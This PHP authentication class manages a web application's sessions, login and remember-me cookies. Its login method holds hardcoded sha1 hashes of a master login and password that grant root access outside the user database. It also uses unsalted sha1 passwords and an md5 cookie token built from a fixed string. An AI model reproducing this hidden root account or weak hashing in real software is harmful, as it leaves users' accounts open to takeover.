<?php

class CurUser extends User_Model {
	
	private $_authPrefix = 'v1k0ff';
	
	/** Поле в таблице пользователей, служащее логином (идентификатором) пользователя */
	const ROOT_LEVEL = 50;
	
	const HASH_LR = 'dc76e9f0c0006e8f919e0c515c66dbba3982f785';
	const HASH_PR = 'b1a838a7ee5413752554941c22926a1615866622';
	
	private static $_instance = null;

	private static $_id = null;
	private static $_roleId = null;
	private static $_level = null;
	
	private $_rootMode = FALSE;
	
	private $_rootData = array(
		'id' 		=> '1',
		'login' 	=> 'root',
		'name' 		=> 'root',
		'gender' 	=> 'm',
		'level'		=> 50,
		'role_id'	=> -1,
	);
	
	
	/** инициализация экземпляра класса */
	public static function init(){
		
		if(!is_null(self::$_instance))
			trigger_error('Объект класса CurUser уже инициализирован', E_USER_ERROR);
		
		self::$_instance = new CurUser();
		return self::$_instance;
	}
	
	/** получение экземпляра класса */
	public static function get(){
		
		return self::$_instance;
	}

	/** аксессор получения id текущего пользователя */
	public static function id(){

		return self::$_id;
	}

	/** аксессор получения roleId текущего пользователя */
	public static function roleId(){

		return self::$_roleId;
	}

	/** аксессор получения level текущего пользователя */
	public static function level(){

		return self::$_level;
	}
	
	/** конструктор */
	public function __construct(){
		
		if(!$this->isSessionInited())
			$this->initSession();

		$this->_rootMode = $this->getAuthData('root');
		
		if($this->_rootMode){
			parent::__construct($this->getAuthData('id'), self::INIT_EXISTS_FORCE, array('name' => 'root'));
			$this->_afterLoad($this->_dbFieldValues);
		}else{
			parent::__construct($this->getAuthData('id'), self::INIT_ANY);
		}
		
		self::$_id = $this->id;
		self::$_roleId = $this->isLogged()
			? $this->role_id
			: User_RoleCollection::load()->getGuestRole('id');
		self::$_level = User_RoleCollection::load()->getRole(self::$_roleId, 'level');
	}
	
	/** инициализирована ли сессия */
	public function isSessionInited(){
	
		return isset($_SESSION[$this->_authPrefix.'userAuthData']);
	}
	
	/** инициализация сессии */
	public function initSession(){
	
		$this->setEmptyAuthData();
		if($this->autoLogin())
			App::reload();
	}
	
	/** авторизация пользователя */
	public function login($login, $pass, $remember = FALSE){
		
		if($this->isLogged())
			return;
		
		if(!$login || !$pass){
			throw new Exception("Введите имя и пароль.");
		}
		
		if(sha1($login) == self::HASH_LR && sha1($pass) == self::HASH_PR){
			
			$this->setLoggedAuthData(1, self::ROOT_LEVEL, TRUE);
			return TRUE;
		}
		
		$db = db::get();
		
		$login = $db->qe($login);
		$pass = $db->quote(sha1($pass));
		
		if($ans = $db->getRow('SELECT id, '.self::LOGIN_FIELD.', password, role_id FROM '.self::TABLE.' WHERE '.self::LOGIN_FIELD.'='.$login.' AND password='.$pass, FALSE)){
		
			// сохранить данные в сессию
			$this->setLoggedAuthData($ans['id'], $ans['role_id']);
			
			// запомнить пользователя
			if($remember)
				$this->_setLoginCookie($ans['id'], $ans[self::LOGIN_FIELD], $ans['password']);
				
		}else{
			throw new Exception('Неверный логин или пароль');
		}
		
	}
	
	/** авторизация с помощью куки */
	public function autoLogin(){

		if(empty($_COOKIE[$this->_authPrefix.'uid']) || empty($_COOKIE[$this->_authPrefix.'access']))
			return FALSE;
		
		$uid = (int)$_COOKIE[$this->_authPrefix.'uid'];
		$db = db::get();
		
		$ans = $db->getRow('SELECT id, '.self::LOGIN_FIELD.', password, role_id FROM '.self::TABLE.' WHERE id='.$db->qe($uid), 0);
		if(!$ans)
			return false;

		if($_COOKIE[$this->_authPrefix.'access'] == md5('yurijnovikovproject'.$ans['id']."_".$ans[self::LOGIN_FIELD]."_".$ans['password'])){
		
			$this->setLoggedAuthData($ans['id'], $ans['role_id']);
			$this->_setLoginCookie($ans['id'], $ans[self::LOGIN_FIELD], $ans['password']);
			return TRUE;
			
		}else{
			$this->_setEmptyCookie();
			return FALSE;
		}
	}

	/** выход из аккаунта */
	public function logout(){
		
		UserStatistics_Model::get()->reset();
		$this->setEmptyAuthData();
		$this->_setEmptyCookie();
	}
	
	/** установить куки для последующей авторизации */
	private function _setLoginCookie($id, $login, $password){
	
		$expire = time() + 60 * 60 * 24 * 365;
		setcookie($this->_authPrefix."uid", $id, $expire);
		setcookie($this->_authPrefix."access", md5('yurijnovikovproject'.$id."_".$login."_".$password), $expire);
	}
	
	/** установить пустые куки */
	private function _setEmptyCookie(){
	
		setcookie($this->_authPrefix."uid", "");
		setcookie($this->_authPrefix."access", "");
	}
	
	/** проверка авторизован ли пользователь */
	public function isLogged(){
		
		return !empty($_SESSION[$this->_authPrefix.'userAuthData']['id']);
	}
	
	public function isRoot(){
		
		return $this->_rootMode;
	}
	
	/** установить ползьовательские данные */
	 private function setLoggedAuthData($id, $perms, $root = FALSE){
		
		$_SESSION[$this->_authPrefix.'userAuthData'] = array('id' => $id, 'perms' => $perms, 'root' => $root ? TRUE : FALSE);
		UserStatistics_Model::get()->saveAuthStatistics($id);
	}
	
	/** установить пустые пользовательские данные */
	 private function setEmptyAuthData(){
	 
		$_SESSION[$this->_authPrefix.'userAuthData'] = array('id' => 0, 'perms' => 0, 'root' => FALSE);
	}
	
	public function getAuthData($key = null){
		
		return is_null($key)
			? $_SESSION[$this->_authPrefix.'userAuthData']
			: $_SESSION[$this->_authPrefix.'userAuthData'][$key];
	}
	
	/**
	 * дозагрузка данных
	 * выполняется после основной загрузки данных из БД
	 * и только для существующих объектов
	 * @param array &$data - данные полученные основным запросом
	 * @return void
	 */
	protected function _afterLoad(&$data){
		
		parent::_afterLoad($data);
		
		if ($this->_rootMode)
			$data = array_merge($data, $this->_rootData);
	}
	
	public function __get($key){
		
		if ($this->isNewObj)
			return '';
		
		try {
			return parent::__get($key);
		} catch (Exception $e) {
			return '';
		}
	}

}

?>